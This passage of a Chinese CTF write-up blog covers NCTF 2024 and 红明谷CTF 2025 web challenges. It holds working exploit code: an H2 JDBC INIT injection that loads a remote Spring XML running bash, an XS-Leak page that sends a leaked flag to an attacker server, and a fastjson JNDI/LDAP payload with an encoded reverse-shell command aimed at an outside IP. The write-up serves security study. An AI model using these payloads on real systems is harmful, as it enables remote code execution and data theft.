+</span></span><span style="display:flex;"><span>            nodeC <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.util.HashMap$Entry&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        Constructor<span style="color:#f92672">&lt;?&gt;</span> nodeCons <span style="color:#f92672">=</span> nodeC.<span style="color:#a6e22e">getDeclaredConstructor</span>(<span style="color:#66d9ef">int</span>.<span style="color:#a6e22e">class</span>, Object.<span style="color:#a6e22e">class</span>, Object.<span style="color:#a6e22e">class</span>, nodeC);
+</span></span><span style="display:flex;"><span>        nodeCons.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Object tbl <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">newInstance</span>(nodeC, 2);
+</span></span><span style="display:flex;"><span>        Array.<span style="color:#a6e22e">set</span>(tbl, 0, nodeCons.<span style="color:#a6e22e">newInstance</span>(0, v1, v1, <span style="color:#66d9ef">null</span>));
+</span></span><span style="display:flex;"><span>        Array.<span style="color:#a6e22e">set</span>(tbl, 1, nodeCons.<span style="color:#a6e22e">newInstance</span>(0, v2, v2, <span style="color:#66d9ef">null</span>));
+</span></span><span style="display:flex;"><span>        setFieldValue(s, <span style="color:#e6db74">&#34;table&#34;</span>, tbl);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> s;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>但执行会报错：</p>
+<pre tabindex="0"><code>org.h2.jdbc.JdbcSQLDataException: Data conversion error converting &#34;CHARACTER VARYING to JAVA_OBJECT&#34;; SQL statement:
+</code></pre><p><code>newInstance</code>方法签名中的参数为<code>String var0, Object... var1</code>，h2数据库无法直接将字符串<code>http://ip:port/exp.xml</code>转换成<code>Object</code>。</p>
+<p>然后又找到一个反序列化接口，可以先将字符串<code>http://ip:port/exp.xml</code>序列化，然后在h2 sql中执行反序列化并保存为变量，然后传参给<code>newInstance</code>即可。</p>
+<p><code>org.h2.util.JdbcUtils#deserialize</code>方法可以触发原生反序列化，返回值为Object。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">deserialize</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> var0, JavaObjectSerializer var1) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (var1 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> var1.<span style="color:#a6e22e">deserialize</span>(var0);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (serializer <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> serializer.<span style="color:#a6e22e">deserialize</span>(var0);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            ByteArrayInputStream var2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(var0);
+</span></span><span style="display:flex;"><span>            ObjectInputStream var3;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (SysProperties.<span style="color:#a6e22e">USE_THREAD_CONTEXT_CLASS_LOADER</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">final</span> ClassLoader var4 <span style="color:#f92672">=</span> Thread.<span style="color:#a6e22e">currentThread</span>().<span style="color:#a6e22e">getContextClassLoader</span>();
+</span></span><span style="display:flex;"><span>                var3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(var2) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">protected</span> Class<span style="color:#f92672">&lt;?&gt;</span> resolveClass(ObjectStreamClass var1) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">return</span> Class.<span style="color:#a6e22e">forName</span>(var1.<span style="color:#a6e22e">getName</span>(), <span style="color:#66d9ef">true</span>, var4);
+</span></span><span style="display:flex;"><span>                        } <span style="color:#66d9ef">catch</span> (ClassNotFoundException var3) {
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">resolveClass</span>(var1);
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                };
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                var3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(var2);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> var3.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Throwable var5) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> DbException.<span style="color:#a6e22e">get</span>(90027, var5, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{var5.<span style="color:#a6e22e">toString</span>()});
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>var1</code>为<code>NULL</code>即可，var0需要为字节数组，h2 sql字节数组的表示方法：</p>
+<blockquote>
+<p><a href="https://www.h2database.com/html/grammar.html#bytes">https://www.h2database.com/html/grammar.html#bytes</a>
+<img alt="2" loading="lazy" src="/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/images/2.png"></p>
+</blockquote>
+<p>POC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// String path = &#34;http://ip:port/exp.xml&#34;;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ser(path);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>String path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;aced....&#34;</span>;        <span style="color:#75715e">// path 序列化数据的hex</span>
+</span></span><span style="display:flex;"><span>String url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS deserialize FOR &#39;org.h2.util.JdbcUtils.deserialize&#39;\\;CREATE ALIAS expNewInstance FOR &#39;org.h2.util.Utils.newInstance&#39;\\;SET @path = (SELECT deserialize(X&#39;&#34;</span> <span style="color:#f92672">+</span> path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;,NULL))\\;CALL expNewInstance(&#39;org.springframework.context.support.ClassPathXmlApplicationContext&#39;,@path)\\;&#34;</span>;
+</span></span></code></pre></div><p>部署<code>exp.xml</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;beans</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.springframework.org/schema/beans&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;bean</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;pb&#34;</span> <span style="color:#a6e22e">class=</span><span style="color:#e6db74">&#34;java.lang.ProcessBuilder&#34;</span> <span style="color:#a6e22e">init-method=</span><span style="color:#e6db74">&#34;start&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;constructor-arg</span> <span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;list&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;value&gt;</span>bash<span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;value&gt;</span>-c<span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;value&gt;</span>whoami<span style="color:#f92672">&lt;/value&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/list&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/constructor-arg&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/bean&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/beans&gt;</span>
+</span></span></code></pre></div><h2 id="internal_api">internal_api<a hidden class="anchor" aria-hidden="true" href="#internal_api">#</a></h2>
+<p>xs-leak，无cookie限制，无csrf_token限制，单纯的网路限制，直接script加载通过<code>onload</code>和<code>onerror</code>判断。</p>
+<p>POC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://192.168.72.132:8000/search?s=a</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">top.sign=false</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">top.sign=true</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>当搜索结果为空时报500错误，触发onerror，有数据时状态码为200，触发onload。</p>
+<p>script标签只会在html docuemnt加载时执行，如果之后通过js写入新的script不会被执行。通过iframe嵌入子页面，在子页面里重新加载DOM树可以再次执行script标签。将script写入iframe srcdoc属性里即可：</p>
+<p>vpsip换成自己的服务器。部署以下html文件，让bot访问即可。</p>
+<p>POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">head</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sign</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">host</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1:8000/internal/search?s=&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">CHA</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789abcdef-}&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">ms</span>) =&gt; <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">ms</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sendback</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;http://&lt;vpsip&gt;:port/?flag=&#39;</span> <span style="color:#f92672">+</span> encodeURI(<span style="color:#a6e22e">data</span>), <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">send</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">payload</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">top</span>.<span style="color:#a6e22e">sign</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">top</span>.document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;workspace&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;iframe srcdoc=&#34;&lt;script src=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> encodeURI(<span style="color:#a6e22e">payload</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">atob</span>(<span style="color:#e6db74">&#39;IG9uZXJyb3I9dG9wLnNpZ249ZmFsc2Ugb25sb2FkPXRvcC5zaWduPXRydWU+PC9zY3JpcHQ+Ij48L2lmcmFtZT4=&#39;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">top</span>.<span style="color:#a6e22e">sign</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span>){
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">50</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">top</span>.<span style="color:#a6e22e">sign</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">main</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">500</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nctf{&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">flag</span>.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">&#34;}&#34;</span>)){
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">CHA</span>.<span style="color:#a6e22e">length</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">CHA</span>.<span style="color:#a6e22e">charAt</span>(<span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">payload</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">s</span>) {
+</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">CHA</span>.<span style="color:#a6e22e">charAt</span>(<span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sendback</span>(<span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">main</span>();
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;workspace&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><h1 id="红明谷ctf-2025">红明谷CTF 2025<a hidden class="anchor" aria-hidden="true" href="#红明谷ctf-2025">#</a></h1>
+<h2 id="日记本">日记本<a hidden class="anchor" aria-hidden="true" href="#日记本">#</a></h2>
+<p>扫目录得到<code>/actuator/swagger-ui.html</code>和<code>/actuator/heapdump</code>。</p>
+<p>注册接口已弃用，将v1改为v2即可，注意v2参数需要用get传输：
+<img alt="6" loading="lazy" src="/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/images/6.png"></p>
+<p><code>/api/auth/update</code>可以修改为admin权限，key可以从<code>/actuator/heapdump</code>读取。修改之后需要重新登录才能获得admin权限。</p>
+<p><img alt="7" loading="lazy" src="/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/images/7.png"></p>
+<p><code>/api/admin/hint</code>可以下载源码。</p>
+<p>存在fastjson反序列化，有<code>CC3.2.1</code>依赖，但jdk版本为8u342，无法直接jndi加载恶意类，尝试LDAP反序列化绕过打CC链。</p>
+<p>触发jndi，用JNDIMap打CC1反序列化，反弹shell即可：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;a&#34;</span>:{
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;@type&#34;</span> : <span style="color:#e6db74">&#34;Lcom.sun.rowset.JdbcRowSetImpl;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;dataSourceName&#34;</span> : <span style="color:#e6db74">&#34;ldap://119.45.252.144:1389/Deserialize/CommonsCollectionsK1/Command/YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TVRrdU5EVXVNalV5TGpFME5DODRNREF4SURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQ==&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;autoCommit&#34;</span> : <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;b&#34;</span>:{
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;username&#34;</span>:{
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;@type&#34;</span>:<span style="color:#e6db74">&#34;java.net.InetAddress&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;val&#34;</span>:<span style="color:#e6db74">&#34;pppppasdasd.c37af96d-ec4e-43e4-8bd3-3c347d9eb7b8.dnshook.site&#34;</span>
+</span></span><span style="display:flex;"><span>        }, 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>java -jar JNDIMap-0.0.1.jar -i 119.45.252.144
+</span></span></code></pre></div><p>根据admin控制器里的提示，flag在<code>/app/F1A9.txt</code>中。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
